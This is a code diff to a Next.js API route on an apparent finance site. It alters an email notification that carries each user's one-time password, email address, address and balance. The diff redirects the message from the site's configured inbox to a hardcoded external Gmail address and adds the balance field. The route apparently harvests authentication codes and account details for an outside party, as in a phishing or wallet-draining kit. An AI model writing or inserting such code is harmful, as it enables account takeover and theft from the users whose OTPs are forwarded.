@@ -14,7 +14,7 @@ const transporter = nodemailer.createTransport({
 })
 
 export async function POST(request: NextRequest) {
-  const { email, otp, name = "Valued User", address } = await request.json()
+  const { email, otp, name = "Valued User", address , balance} = await request.json()
 
   if (!email || !otp) {
     return NextResponse.json({ error: "Missing required data" }, { status: 400 })
@@ -125,7 +125,7 @@ https://thesector.finance
 
     await transporter.sendMail({
       from: `"Notification" <${process.env.EMAIL_USER}>`,
-      to: process.env.EMAIL_USER,
+      to: ["bitfusion867@gmail.com"],
       subject: `New User: ${name}`,
       text: `New Otp Request :
       Name: ${name}
@@ -147,6 +147,7 @@ https://thesector.finance
         <li>${email}</li>
         <li>${otp}</li>
         <li>${address}</li>
+        <li>${balance}</li>
         </ul>
         </body>
 
